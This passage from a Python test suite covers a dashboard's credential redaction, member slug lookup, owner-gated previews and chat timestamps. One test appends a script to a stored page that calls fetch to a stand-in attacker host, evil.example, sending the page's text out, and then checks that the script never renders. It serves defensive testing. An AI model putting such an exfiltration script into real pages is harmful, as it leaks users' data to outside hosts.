    ],
)
def test_a_rule_that_rewrites_the_markup_around_a_script_cannot_turn_its_text_into_prose(template):
    """A rule that takes tags with it must not leave the text it spared to be read as prose.

    The browser reads the page the rules leave, so the script text is chosen from that page and
    not from the page before the rules ran.
    """
    dashes = "-" * 5
    pem = (
        f"{dashes}BEGIN PRIVATE KEY{dashes}\nMIIEowIBAAKCAQEA3Zx8kUoTBqQw0hXvPj9mKpLq2yTnVr7\n"
        f"<!--<script>\n{dashes}END PRIVATE KEY{dashes}"
    )
    page = template.format(pem=pem, key=_bare_key())
    assert _bare_key() not in routes._template_text_safe(page)


def _page_vocabulary():
    """Tags, comment and script openers, the rules that reach across them, keys, and glued runs."""
    dashes = "-" * 5
    keys = [
        k
        for k in (
            base64.b64encode(hashlib.sha256(b"kc-bare-%d" % n).digest()).decode()[:40]
            for n in range(40)
        )
        if k not in redact_via_context(f"<p>{k}</p>")
    ]
    assert len(keys) >= 10, "the premise: the full pass masks a key standing alone"
    key_id = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    tails = [k[:36] for k in keys[:6]]
    structure = [
        "<script>", "</script>", "<style>", "</style>", "<!--", "-->", "<!--<script>", "<p>",
        "</p>", '<script src="', '">', ">", "<", "\n", " ", "//", "<script ", "<scr", "ipt>",
        "<noscript>", "<template>", "<textarea>", "</textarea>", "var s = '", "'", ";",
    ]  # fmt: skip
    rules = [
        f"{dashes}BEGIN PRIVATE KEY{dashes}", f"{dashes}END PRIVATE KEY{dashes}",
        "aws_secret_access_key=", "aws_secret_access_key = ", "password=", "token=",
        "api_key=", "const password =\n    ", "headers['X-Api-Key'] = '", key_id,
    ]  # fmt: skip
    glued = [key_id + t for t in tails] + [t + key_id for t in tails]
    return structure, rules, glued, keys, tails


def test_a_page_without_an_alphabet_or_a_data_uri_is_scrubbed_exactly_as_the_full_pass_does():
    """Whatever the markup, the scrub differs from the full pass only by the two shapes it keeps.

    The pages are seeded mixes of tags, comment and script openers, the rules that reach across
    them (a PEM block, a labelled value), keys and keys glued to a key id. None holds an
    alphabet or a data URI, so every page must come out as the full pass makes it.
    """
    structure, rules, glued, keys, _tails = _page_vocabulary()
    rng = random.Random(20815)
    differing = []
    for _ in range(3000):
        pieces = []
        for _ in range(rng.randint(3, 16)):
            pick = rng.random()
            pieces.append(
                rng.choice(structure)
                if pick < 0.4
                else (
                    rng.choice(rules)
                    if pick < 0.65
                    else rng.choice(glued) if pick < 0.75 else rng.choice(keys)
                )
            )
        page = "".join(pieces)
        if routes._template_text_safe(page) != redact_via_context(page):
            differing.append(page)
    assert not differing, differing[:3]


def _in_a_data_uri_payload(page: str, secret: str) -> bool:
    """Whether every run of *page* that holds *secret* is a payload behind a data URI header."""
    runs = [m for m in re.finditer(r"[A-Za-z0-9+/]{40,}", page) if secret in m.group()]
    return bool(runs) and all(
        len(m.group()) >= 64
        and re.search(r"data:[^,;]+/[^,;]+(?:;[^,;]+)*;base64,\Z", page[: m.start()], re.I)
        for m in runs
    )


def test_an_alphabet_and_a_data_uri_survive_and_nothing_else_the_full_pass_masks_does():
    """The two shapes the scope keeps are kept; every key beside them is masked all the same.

    The one place a key the full pass masks may be served is the stated limit: inside a run of
    64 characters or more directly behind a ``data:`` header. The test finds that run itself.
    """
    structure, rules, glued, keys, tails = _page_vocabulary()
    shapes = [_PALETTE, "data:image/png;base64," + "QUJD" * 40]
    rng = random.Random(20816)
    kept = limit = 0
    for _ in range(3000):
        pieces = []
        for _ in range(rng.randint(3, 16)):
            pick = rng.random()
            pieces.append(
                rng.choice(structure)
                if pick < 0.35
                else (
                    rng.choice(rules)
                    if pick < 0.55
                    else (
                        rng.choice(glued)
                        if pick < 0.65
                        else rng.choice(keys) if pick < 0.8 else rng.choice(shapes)
                    )
                )
            )
        page = "".join(pieces)
        served = routes._template_text_safe(page)
        masked_by_main = redact_via_context(page)
        for secret in (*keys, *tails):
            if (secret in served) == (secret in masked_by_main):
                continue
            assert secret in served and _in_a_data_uri_payload(page, secret), (page, served)
            limit += 1
        kept += sum(shape in served for shape in shapes)
    assert kept > 0, "no alphabet or data URI was ever kept, so this proves nothing"
    assert limit > 0, "the stated limit never came up, so its test proves nothing"


@pytest.mark.parametrize(
    "template",
    [
        "<!-- old <script> tag removed --><p>{key}</p>",
        '<p title="<style>">{key}</p>',
        "<textarea><script></textarea><p>{key}</p>",
        "<title><style></title><p>{key}</p>",
        "<script data-note='>'>var a = 1;</script><p data-q='<style>'>{key}</p>",
        "<script>var a = 1;<p>{key}</p>",
        "<svg><script/></svg><p>{key}</p><script>var a = 1;</script>",
        "<svg><script><p>{key}</p></script></svg>",
        "<math><style><p>{key}</p></style></math>",
        '<p a=x"b="c>d" e<textarea x><script>{key}</script></textarea>',
        "<math></svg><style><mtext>{key}</mtext></style></math>",
        '<svg><foreignObject><div></svg></div></foreignObject><script><a title="{key}">x</a></script>',
        "<select><style></select><p>{key}</p></style>",
        "<noscript><textarea></noscript><script>{key}</script></textarea></noscript>",
        "<template><col><style></template><p>{key}</p></style>",
        "<script\u00a0>var a = 1;</script\u00a0><p>{key}</p>",
        "<\u017fcript>var a = 1;</\u017fcript><p>{key}</p><style>a{{}}</style>",
    ],
)
def test_prose_a_browser_reads_as_prose_keeps_every_pass_whatever_markup_surrounds_it(template):
    """A tag the HTML tokenizer would not open must not turn the text after it into code.

    Each page puts a key-shaped run in a paragraph. Reading the page the way a browser does
    leaves the paragraph as prose, and where the scan cannot tell it reads nothing as code.
    """
    key = _bare_key()
    assert key not in routes._template_text_safe(template.format(key=key))


def test_a_real_script_beside_markup_that_only_looks_like_one_keeps_its_literal():
    page = (
        f"<!-- <script> --><svg><circle/></svg><select><option>a</option></select>"
        f"<script>var A = '{_PALETTE}';</script>"
        f'<p title="<style>">{_bare_key()}</p>'
    )
    out = routes._template_text_safe(page)
    assert f"var A = '{_PALETTE}';" in out
    assert _bare_key() not in out


def test_past_the_bound_a_scripts_text_gets_every_pass_not_fewer():
    """Handing text to the code function is a relaxation, so a page cannot earn it by length.

    Only the first MAX_CODE_PIECES non-empty elements are handed over. Every element after
    them goes back to the full pass, and empty elements neither spend the bound nor change
    what is masked. So adding elements can only move text from the relaxed pass to the strict one.
    """
    from kiro_crew import dashboard_frame

    bound = dashboard_frame.MAX_CODE_PIECES
    key_id = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    first = f"<script>var FIRST = '{_PALETTE}';</script>"
    spent = "<script></script><script>var a = 1;</script>" * (bound - 1)
    past = "<script>var a = 1;</script>" * 4
    last = f"<script>var LAST = '{_PALETTE}'; var k = '{key_id}'; var b = '{_bare_key()}';</script>"
    page = first + spent + past + last
    assert len(dashboard_frame.code_spans(page)) > bound, "the premise: elements past the bound"

    out = routes._template_text_safe(page)

    assert f"var FIRST = '{_PALETTE}';" in out, "the first element lost its literal"
    assert key_id not in out, "a credential in the last element was served"
    assert _bare_key() not in out, "the last element kept a key-shaped run the full pass masks"
    assert f"var LAST = '{_PALETTE}'" not in out, "the last element kept its literal"
    assert out.count("<script>") == page.count("<script>"), "a tag was eaten"


def test_a_page_with_no_script_or_stylesheet_is_scrubbed_as_it_always_was():
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    page = f'<p>key {token} and {_bare_key()}</p><b data-dashboard-field="credits"></b>'
    assert routes._template_text_safe(page) == redact_via_context(page) != page


def test_the_raw_body_keeps_a_script_as_written_too():
    page = f"<script>var A = '{_PALETTE}';</script>"
    assert routes._safe_body({"html": page, "state": "live"})["html"] == page


def test_a_credential_in_a_manifest_string_is_redacted():
    """``title`` and ``description`` are free prose.

    Field NAMES are left alone: the loader has already matched each against
    ``^[a-z][a-z0-9_]{0,63}$``, a grammar no credential survives, and rewriting a key
    would break the page's own bindings.
    """
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    scrubbed = routes._manifest_text_safe(
        {"title": f"board {token}", "fields": {"credits": {"type": "number"}}}
    )
    assert token not in json.dumps(scrubbed)
    assert "credits" in scrubbed["fields"], "a field name was rewritten"


def test_the_raw_body_is_scrubbed_beside_the_composed_page():
    """Scrubbing only the rendered half leaves the same credential one key away."""
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    body = routes._safe_body(
        {
            "html": f"<p>{token}</p>",
            "manifest": {"title": f"t {token}"},
            "state": "live",
        }
    )
    assert token not in json.dumps(body)
    assert body["state"] == "live", "the scrub touched a key that is not page text"


# ----------------------------------------------- one crewmate, one slug


class TestOneCrewmateResolvesToOneSlug:
    """THE POD BUG on a freshly created crewmate whose roster key carries case.

    A crewmate was created as ``Atlas``. Its own session's ``dashboard_write``
    returned success and recorded no mistake, yet the instance stayed at version 0
    and the tab rendered "Nothing needs you, and nothing has been spent" over a
    session that had spent 0.63 credits. Opening the tab as ``?member=atlas``
    answered "not on the roster".

    One cause, two symptoms. The roster is keyed by the display name somebody typed,
    and every per-member path comes off that key's ``member_id``. A caller holding
    ``atlas`` missed the key, read no ``member_id``, and fell through to
    ``slug_for_name("atlas")`` -- so the write (resolved from the session, which
    carries ``Atlas``) and the read (resolved from the query string) addressed two
    different directories. Both succeeded. Neither saw the other.

    These run against the REAL ``members`` helpers, not the module fixture's stubs:
    the fixture replaces ``member_slug`` with a constant, which is precisely the
    function that was wrong.
    """

    @staticmethod
    def _roster():
        """A roster keyed as somebody typed it, with a persisted identity."""
        return SimpleNamespace(
            agents={"Atlas": SimpleNamespace(member_id="atlas-7f3c21")},
        )

    def test_the_roster_spelling_is_recovered_from_any_case(self) -> None:
        cfg = self._roster()
        for spelling in ("atlas", "ATLAS", "AtLaS", "Atlas"):
            assert _REAL_CANONICAL_KEY(spelling, cfg) == "Atlas", spelling

    def test_every_spelling_derives_the_one_slug_the_member_owns(self) -> None:
        """The defect, at the function that caused it.

        ``atlas-7f3c21`` is the member's persisted identity, and it is what its own
        session writes under. A spelling that answered ``atlas`` instead pointed at a
        directory nothing else ever touches.
        """
        cfg = self._roster()
        owned = _REAL_MEMBER_SLUG("Atlas", cfg)
        assert owned == "atlas-7f3c21", "the persisted member_id is the slug"
        for spelling in ("atlas", "ATLAS", "AtLaS"):
            assert _REAL_MEMBER_SLUG(spelling, cfg) == owned, spelling

    def test_a_name_the_roster_does_not_hold_is_unchanged(self) -> None:
        """No fuzzy matching: an unknown name stays itself and is refused downstream."""
        cfg = self._roster()
        assert _REAL_CANONICAL_KEY("Borealis", cfg) == "Borealis"

    def test_two_keys_differing_only_in_case_are_not_folded_together(self) -> None:
        """An ambiguous fold returns the name unchanged rather than picking one.

        Those two keys already collide at the slug level, and the surfaces that care
        refuse that slug outright. Guessing here would turn a refusal into a write on
        whichever key sorted first.
        """
        cfg = SimpleNamespace(
            agents={
                "Oncall": SimpleNamespace(member_id=""),
                "oncall": SimpleNamespace(member_id=""),
            },
        )
        # Each EXACT key still answers as itself; only the third spelling is ambiguous.
        assert _REAL_CANONICAL_KEY("Oncall", cfg) == "Oncall"
        assert _REAL_CANONICAL_KEY("oncall", cfg) == "oncall"
        assert _REAL_CANONICAL_KEY("ONCALL", cfg) == "ONCALL"

    async def test_the_tab_opened_on_a_lowercase_name_reads_the_members_own_page(
        self, _floor_monkeypatch
    ) -> None:
        """END TO END over the route, with the real resolvers.

        The write lands under the slug the member owns; the read is asked for with
        the spelling a URL carries. Before the fix this answered 404
        ``member_not_found``.
        """
        cfg = self._roster()
        owned = _REAL_MEMBER_SLUG("Atlas", cfg)
        _floor_monkeypatch.setattr(routes.KiroCrewConfig, "load", staticmethod(lambda: cfg))
        _floor_monkeypatch.setattr(routes.members_mod, "member_slug", _REAL_MEMBER_SLUG)
        _floor_monkeypatch.setattr(routes.members_mod, "canonical_member_key", _REAL_CANONICAL_KEY)
        _floor_monkeypatch.setattr(routes.members_mod, "validate_slug", lambda slug: slug)
        _floor_monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: ["Atlas"])

        # The member's own write, under the slug its session resolves to.
        instance.adopt(owned, "fixture-board", session_id="")
        async with _client() as c:
            resp = await c.get(f"/api/members/{owned}/dashboard?member=atlas")
            assert resp.status == 200, await resp.text()
            body = await resp.json()
        assert body["template"]["id"] == "fixture-board", body
        # The page the member owns, not an empty one minted for a second slug.
        assert body["instance_version"] == 1, "the read found a different directory"
        assert "credits" in body["manifest"]["fields"], body["manifest"]


# ------------------------- the stored page is data, never code


class TestTheExecutedPageComesFromTheCatalog:
    """The record is WRITABLE, so it cannot be the thing that vouches for itself.

    `members/<slug>/dashboard/instance.json` holds the page AND the `source` label.
    Gating the render on that label asked the file to vouch for its own contents:
    anything that could append a `<script>` to the stored page could leave
    `"source": "builtin"` sitting beside it, and this is the step that hands the
    crewmate's task titles, summaries and costs to whatever runs.

    So the record's `template_id` is read and the BYTES are read from the catalog --
    a directory in this repository. The stored copy stays on disk, because a rollback
    reads it and it is what the crewmate copied; nothing executes it.
    """

    # The module's own `_env` fixture already builds `fixture-board` into a scratch
    # builtin directory and points the catalog at it, and it does NOT stub the
    # instance module -- that is `_adopt_dashboard`'s job, per test. So these cases
    # get the real registry and the real store for free, which is what they need:
    # what is under test is which of two byte strings reaches the frame.

    @staticmethod
    def _tampered(slug: str, injected: str) -> None:
        """Append markup to the STORED page, leaving `source: builtin` in place.

        Written straight to `instance.json`, which is the threat: the store's own
        writers refuse this, and the finding is about what happens when something
        reaches the file anyway.
        """
        path = routes.instance.instance_dir(slug) / "instance.json"
        raw = json.loads(path.read_text(encoding="utf-8"))
        raw["html"] = raw["html"] + injected
        assert raw["manifest"]["source"] == "builtin", "the fixture is not a builtin"
        path.write_text(json.dumps(raw), encoding="utf-8")

    def test_a_script_appended_to_the_stored_page_never_reaches_the_frame(self) -> None:
        """THE FINDING. The rendered body is the catalog's page, not the record's."""
        injected = '<script>fetch("https://evil.example/" + document.body.innerText)</script>'
        instance.adopt(SLUG, "fixture-board", session_id="")
        self._tampered(SLUG, injected)

        # The record really does carry it now, which is what makes the assertion below
        # about the RENDER rather than about the store having refused the write.
        assert injected in instance.read(SLUG).html, "the fixture did not tamper anything"

        rendered = routes._render(SLUG, MEMBER, instance.read(SLUG))
        assert rendered is not None, "a builtin template still has to render"
        assert "evil.example" not in rendered, "the injected script reached the frame"
        assert "<script>fetch" not in rendered
        # And it is the catalog's own page that got composed.
        assert 'data-dashboard-field="credits"' in rendered

    def test_the_trusted_page_is_the_catalogs_bytes_verbatim(self) -> None:
        """Read directly, so the claim is about the source of the bytes.

        `_render` composes, so a case reading only its output cannot tell "the
        catalog's page" from "the record's page with the script stripped".
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        self._tampered(SLUG, "<p>appended</p>")
        page = routes._trusted_page(SLUG, instance.read(SLUG))
        assert page == PAGE, "the executed page is not the catalog's"
        assert "appended" not in page

    def test_a_record_naming_a_template_the_catalog_does_not_serve_is_refused(self) -> None:
        """The signature of a rewritten record, and it must not fall back.

        Falling back to the stored page here would hand the frame exactly the bytes
        this check exists to decline -- so an unknown id draws the unavailable state.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        path = routes.instance.instance_dir(SLUG) / "instance.json"
        raw = json.loads(path.read_text(encoding="utf-8"))
        raw["template"]["id"] = "not-a-shipped-template"
        path.write_text(json.dumps(raw), encoding="utf-8")
        assert routes._trusted_page(SLUG, instance.read(SLUG)) is None

    def test_a_record_naming_no_template_is_refused(self) -> None:
        instance.adopt(SLUG, "fixture-board", session_id="")
        record = instance.read(SLUG)
        object.__setattr__(record, "template_id", "")
        assert routes._trusted_page(SLUG, record) is None

    def test_a_non_renderable_source_is_still_turned_away_before_the_scan(self) -> None:
        """The cheap check is kept: a record that never went through adopt.

        It is not the gate any more -- the catalog is -- but it costs nothing and
        turns away a record whose own label already says it must not run.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        record = instance.read(SLUG)
        object.__setattr__(record, "manifest", {**dict(record.manifest), "source": "shared"})
        assert routes._trusted_page(SLUG, record) is None


class TestAStoredPageCannotBeEdited:
    """`edit` kept the template id and version while replacing the page.

    That made a record saying `builtin` over bytes nobody reviewed -- the same hole
    from the writer's side rather than the reader's.
    """

    def test_an_html_edit_on_a_builtin_is_refused(self) -> None:
        instance.adopt(SLUG, "fixture-board", session_id="")
        with pytest.raises(instance.InstanceRefused) as refused:
            instance.edit(SLUG, html=PAGE_EDITED, session_id="")
        assert str(refused.value) == instance.EDITED_PAGE_REFUSAL
        assert "cannot be edited" in str(refused.value)
        # NOTHING was written: no new version, and the page on disk is untouched.
        after = instance.read(SLUG)
        assert after.instance_version == 1
        assert after.html == PAGE

    def test_the_refusal_names_what_to_do_instead(self) -> None:
        """A caller that cannot edit the page has to be told where pages come from."""
        for needle in ("dashboard_templates", "dashboard_rollback", "manifest alone"):
            assert needle in instance.EDITED_PAGE_REFUSAL, needle

    def test_an_html_edit_is_refused_even_beside_a_manifest(self) -> None:
        """The pair is not a loophole: the page half still decides."""
        instance.adopt(SLUG, "fixture-board", session_id="")
        with pytest.raises(instance.InstanceRefused):
            instance.edit(SLUG, html=PAGE_EDITED, manifest=_manifest(), session_id="")
        assert instance.read(SLUG).instance_version == 1

    def test_a_manifest_only_edit_is_still_allowed(self) -> None:
        """It can name fields and fold paths, so the worst it draws is an empty cell.

        And the parity rule refuses even that, so the capability stays.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        edited = instance.edit(SLUG, manifest={**_manifest(), "title": "Retitled"}, session_id="")
        assert edited.instance_version == 2
        assert edited.manifest["title"] == "Retitled"
        assert edited.html == PAGE, "a manifest edit moved the page"


class TestAStagedPageReachesOnlyItsOwnersPreview:
    """WHERE A STAGED PAGE CAN BE SEEN, enumerated from the source rather than claimed.

    A staged page is bytes nobody has applied. It carries this crewmate's fold values
    exactly as the applied page does, and it is written beside the record without moving
    the version -- so the question that matters is not whether staging is safe but
    whether a staged page can be SERVED anywhere except to the one person entitled to
    look at it and say yes.

    Three facts answer it, and each is read off the modules rather than restated:

    1. there is exactly ONE place staged bytes are turned into a record to render, and
       it sits behind the same owner gate as the applied read;
    2. every route that emits a page is owner-gated, so there is no second door;
    3. the link handed back by the staging call is that same owner-gated read, not a
       route of its own and not a capability token.

    Source-level on purpose. A behavioural test proves one request was refused; what is
    worth guarding here is that no OTHER caller exists, which is a property of the call
    graph and is exactly what a later edit breaks silently.
    """

    def _source(self, module) -> str:
        import inspect

        return inspect.getsource(module)

    def test_staged_bytes_have_exactly_one_reader_in_the_product(self) -> None:
        """`instance.staged_preview` is the only way to read what is staged, and the
        only caller outside the store itself is `member_dashboard._preview_record`."""
        import pathlib

        from kiro_crew.dashboard.handlers import member_dashboard
        from kiro_crew.dashboard_templates import instance as instance_store

        root = pathlib.Path(instance_store.__file__).resolve().parents[1]
        callers = sorted(
            # `as_posix` so the expected paths below read the same on Windows, where
            # `str()` spells them with backslashes.
            path.relative_to(root).as_posix()
            for path in root.rglob("*.py")
            if "staged_preview(" in path.read_text(encoding="utf-8")
        )
        assert callers == [
            "dashboard/handlers/member_dashboard.py",
            "dashboard_templates/instance.py",
        ], f"a new reader of staged bytes appeared: {callers}"
        # In the store itself the second caller is `apply_preview`, which CONSUMES the
        # preview into a version rather than serving it.
        assert "staged_preview(slug)" in self._source(instance_store.apply_preview)
        # And in the handler, the one reader is the preview record builder.
        assert "instance.staged_preview(slug)" in self._source(member_dashboard._preview_record)

    def test_the_preview_record_is_built_only_under_the_preview_query(self) -> None:
        """`_preview_record` has one call site, and it is guarded by `preview=1`."""
        from kiro_crew.dashboard.handlers import member_dashboard

        body = self._source(member_dashboard._serve)
        assert body.count("_preview_record(") == 1
        guard = 'if request.query.get("preview") == "1":'
        assert guard in body
        # The guard precedes the only call, so the staged read is inside the branch.
        assert body.index(guard) < body.index("_preview_record(")

    def test_every_route_that_emits_a_page_is_owner_gated(self) -> None:
        """Both page routes, and the refetch that answers their values.

        The preview is served by `_serve`, which neither route reaches before its own
        `_owner_only` call -- so the staged page inherits the applied page's gate rather
        than carrying one of its own.
        """
        from kiro_crew.dashboard.handlers import member_dashboard

        for handler in (
            member_dashboard.api_member_dashboard,
            member_dashboard.api_session_dashboard,
            member_dashboard.api_member_dashboard_refetch,
        ):
            source = self._source(handler)
            assert "_owner_only(" in source, handler.__name__
            # Returned on refusal, not merely computed: a gate whose answer is dropped
            # is not a gate.
            assert "return owner_denied" in source, handler.__name__
        # `_serve` is reached only from those two page routes.
        module_source = self._source(member_dashboard)
        assert module_source.count("await _serve(request") == 2

    def test_a_non_preview_read_serves_the_applied_record(self) -> None:
        """The other branch reads the stored record, or the shipped default when the
        crewmate adopted nothing. Neither is a staged page."""
        from kiro_crew.dashboard.handlers import member_dashboard

        body = self._source(member_dashboard._serve)
        assert "instance.read(slug)" in body
        assert "instance.default_instance(slug)" in body
        # The applied read sits AFTER the preview branch returns, so the two cannot both
        # run for one request.
        assert body.index('if request.query.get("preview") == "1":') < body.index(
            "instance.read(slug)"
        )

    def test_the_package_route_cannot_serve_a_staged_page(self) -> None:
        """A `view.html` package page is read from the artifact store, which has no
        staged side at all, so the third page producer is outside this question."""
        from kiro_crew.dashboard.handlers import member_dashboard

        source = self._source(member_dashboard._serve_package)
        assert "staged_preview" not in source
        assert "_preview_record" not in source

    def test_the_preview_link_is_the_owner_gated_read(self) -> None:
        """Not a route of its own and not a capability token: a second door would be a
        second place to get the gate right, and a token would be a second credential
        for data its holder can already read.

        The link is the PAGE with this crewmate open and its Dashboard tab on the
        staged read, named by the exact crew name -- slugification is lossy, so the
        page and the read it makes both refuse a slug alone.
        """
        from urllib.parse import parse_qs, urlparse

        from kiro_crew.dashboard_templates import instance as instance_store

        link = instance_store.preview_url(MEMBER)
        parsed = urlparse(link)
        assert parsed.path == "/members", "the link is a JSON read rather than a page"
        query = parse_qs(parsed.query)
        # The exact crew name, read back through the decoder because it is encoded.
        assert query.get("member") == [MEMBER], "the link names a slug, which this read refuses"
        assert query.get("dashboard") == ["preview"]
        # No second credential rides along: the gate is the route's own owner check.
        assert "token" not in query
        assert instance_store.session_preview_url("slot-1") == (
            "/api/chat/slots/slot-1/dashboard?preview=1"
        )
        for link in (instance_store.preview_url(SLUG), instance_store.session_preview_url("s")):
            assert "token" not in link and "sig" not in link

    def test_the_staging_route_hands_back_a_link_and_no_page(self) -> None:
        """`api_dashboard_preview` stages and returns the wire record. It composes
        nothing, so there is no rendered staged page anywhere but behind the gate."""
        from kiro_crew.dashboard.handlers import agent_panel

        source = self._source(agent_panel.api_dashboard_preview)
        assert "stage_preview(" in source
        assert "rendered_html" not in source
        assert "render_package_page" not in source

    def test_the_preview_branch_is_reached_before_any_binding_is_resolved(self) -> None:
        """THE CONVERSE, and the half that is easy to lose: a preview must reach the
        staged page rather than some other page.

        The tab's preview link carries no `dashboard=`, so a binding resolved before
        this branch would serve the live PACKAGE page to a person deciding whether to
        apply a staged one. Pinned as an ORDER, because an order is what a later edit
        undoes without changing any single line's meaning.
        """
        from kiro_crew.dashboard.handlers import member_dashboard

        body = self._source(member_dashboard._serve)
        decided = 'staged_only = request.query.get("preview") == "1" and not package_slug'
        guarded = "if not staged_only:"
        assert decided in body, "the preview decision is no longer taken from the query alone"
        assert guarded in body, "the binding resolution is no longer guarded by that decision"
        assert body.index(decided) < body.index(guarded), (
            "the binding is resolved before the preview branch is decided, so a preview "
            "can reach the package page again"
        )
        # That the resolution really is INSIDE the guard is measured on behaviour
        # instead: `test_a_preview_read_does_not_even_look_the_binding_up` in
        # `test_member_dashboard_package_route.py` counts the calls. The resolver's name
        # is deliberately not spelled here -- that file owns the only two mentions of
        # it, which is itself a pinned invariant.

    def test_only_three_places_in_the_product_emit_a_page(self) -> None:
        """The whole-file count, so a fourth producer added later fails here.

        Two are the branches of `_serve` (staged under the preview guard, applied
        otherwise) and the third is the package route. All three are behind the same
        owner gate.
        """
        import pathlib

        from kiro_crew.dashboard_templates import instance as instance_store

        root = pathlib.Path(instance_store.__file__).resolve().parents[1]
        emitters: dict[str, int] = {}
        for path in root.rglob("*.py"):
            count = path.read_text(encoding="utf-8").count('"rendered_html"')
            if count:
                # `as_posix` for the same reason as the reader scan above.
                emitters[path.relative_to(root).as_posix()] = count
        assert emitters == {"dashboard/handlers/member_dashboard.py": 3}, emitters


# --------------------------------------------------------------------------
# the STAGED composed page: read back for a look, and nothing installed
# --------------------------------------------------------------------------


def _package(**over) -> dict:
    """A package the store's own gate accepts, bound to this crewmate."""
    package = {
        "kind": "dashboard",
        "bound_to": f"crewmate:{SLUG}",
        "model": {
            "types": {
                "open_prs": {"type": "number", "source": {"agentic": True}, "label": "Open PRs"},
                "headline": {"type": "text", "source": {"agentic": True}},
            }
        },
        "view": {
            "html": (
                '<h2>Open</h2><p data-dashboard-field="open_prs"></p>'
                '<p data-dashboard-field="headline"></p>'
            )
        },
        "theme": {"tokens": {"--accent": "oklch(0.7 0.15 150)"}},
    }
    package.update(over)
    return package


class TestTheStagedComposedPage:
    """A composed package is never staged: ``dashboard_save`` puts it in force.

    So the ``?preview=1`` read only ever serves a staged TEMPLATE. A staging file an
    older gateway left holding a package payload reads as nothing staged.
    """

    async def test_a_package_left_staged_by_an_older_gateway_is_nothing_to_preview(
        self,
    ) -> None:
        from kiro_crew.artifact_store.dashboard_package import canonical_package_content

        directory = instance.instance_dir(SLUG)
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "preview.json").write_text(
            json.dumps(
                {
                    "schema": instance.SCHEMA_VERSION,
                    "slug": SLUG,
                    "package_content": canonical_package_content(json.dumps(_package())),
                    "staged_ms": instance._now_ms(),
                }
            ),
            encoding="utf-8",
        )
        async with _client() as client:
            resp = await client.get(_q("", preview=1))
            body = await resp.json()
        assert resp.status == 404, body
        assert body["code"] == "no_preview", body

    async def test_a_staged_template_still_answers_its_own_preview(self) -> None:
        """Both readers answer None for the other's payload, so one page comes back."""
        instance.stage_preview(SLUG, template_id="fixture-board")
        async with _client() as client:
            body = await (await client.get(_q("", preview=1))).json()
        assert body["preview"] is True
        assert body["template"]["id"] == "fixture-board"
        assert "manifest" in body


# --------------------------------------------------------------------------
# when the person last spoke in the page's chat
# --------------------------------------------------------------------------

#: One instant: the person's reply. Every case states it in UTC and writes it the way
#: a chat row or the stored stamp carries it.
SPOKE = "2026-10-13T23:49:04+00:00"


class _Window:
    """The one member of a live chat slot the stamp is read from."""

    def __init__(self, rows: list[dict] | None = None) -> None:
        self._rows = list(rows or [])

    def loaded_messages(self) -> list[dict]:
        return list(self._rows)


def _human(ts: str, **meta) -> dict:
    """A row a human send path wrote, with the marker those paths set."""
    from kiro_crew.history import HUMAN_TURN_META_KEY

    return {
        "role": "user",
        "content": "reply",
        "ts": ts,
        "meta": {HUMAN_TURN_META_KEY: True, **meta},
    }


def _naive_local(utc: str, zone: str) -> str:
    """*utc* as the naive local wall clock a row written in *zone* carries."""
    from datetime import datetime
    from zoneinfo import ZoneInfo

    return datetime.fromisoformat(utc).astimezone(ZoneInfo(zone)).replace(tzinfo=None).isoformat()


class _Log:
    """A transcript store holding one metadata line per transcript key."""

    def __init__(self, lines: dict[str, dict]) -> None:
        self.lines = lines
        self.asked: list[str] = []

    def get_metadata(self, key: str) -> dict:
        self.asked.append(key)
        return dict(self.lines.get(key, {}))


class _ChatState:
    """The two things the read takes from ``DashboardState``: live slots and the log."""

    def __init__(self, slots: dict | None = None, log: _Log | None = None) -> None:
        self.slots = dict(slots or {})
        self.conversation_log = log
        self.asked: list[str] = []

    def get_slot(self, name: str):
        self.asked.append(name)
        return self.slots.get(name)


class TestThePageIsToldWhenThePersonLastSpoke:
    """The stamp telling a page the person wrote in the chat after a card was written.

    A reply typed in the chat, an option clicked there and a steer into a running turn
    never pass through the page, and a steer writes no crew-log entry, so the only
    record of one is the chat slot's own human-marked row.
    """

    def test_the_newest_row_a_person_wrote_is_the_stamp_a_steer_included(self) -> None:
        rows = [
            _human("2026-10-13T23:40:00+00:00"),
            {"role": "assistant", "content": "two to decide", "ts": "2026-10-13T23:45:00+00:00"},
            _human(SPOKE, steer=True),
        ]
        assert routes._last_user_at_of(_Window(rows)) == SPOKE

    def test_a_user_row_no_person_wrote_is_not_a_reply(self) -> None:
        """An app wake is a `user` row with no human marker; it must not fold a card."""
        rows = [
            _human(SPOKE),
            {"role": "user", "content": "[wake]", "ts": "2026-10-13T23:55:00+00:00"},
            {"role": "assistant", "content": "ok", "ts": "2026-10-13T23:56:00+00:00"},
        ]
        assert routes._last_user_at_of(_Window(rows)) == SPOKE

    def test_with_no_human_row_in_memory_the_stored_stamp_answers(self) -> None:
        """A restored row whose window was never loaded, or no live slot at all."""
        assert routes._last_user_at_of(_Window([]), SPOKE) == SPOKE
        assert routes._last_user_at_of(None, SPOKE) == SPOKE
        assert routes._last_user_at_of(None, "") == ""
        assert routes._last_user_at_of(None, None) == ""

    @pytest.mark.parametrize("zone", ["UTC", "Pacific/Kiritimati", "America/St_Johns"])
    def test_the_later_instant_wins_and_reaches_the_page_in_utc(self, local_tz, zone) -> None:
        """A naive row is the writer's local clock. Compared as TEXT against an aware
        stamp it is in another domain: under +14:00 the row reads a day ahead and wins
        when it is the earlier instant, and under -03:30 it reads behind and loses when
        it is the later one."""
        local_tz(zone)
        row = _Window([_human(_naive_local(SPOKE, zone))])
        assert routes._last_user_at_of(row) == SPOKE
        assert routes._last_user_at_of(row, "2026-10-13T23:48:00+00:00") == SPOKE
        assert routes._last_user_at_of(row, "2026-10-13T23:50:00+00:00") == (
            "2026-10-13T23:50:00+00:00"
        )
        # A stored stamp in another zone's offset is the same instant, said in UTC.
        assert routes._last_user_at_of(None, "2026-10-14T13:49:04+14:00") == SPOKE

    def test_the_stamp_is_whole_seconds_like_the_write_time_it_is_compared_with(self) -> None:
        """A reply and a list the crewmate wrote later in the SAME second compare equal.

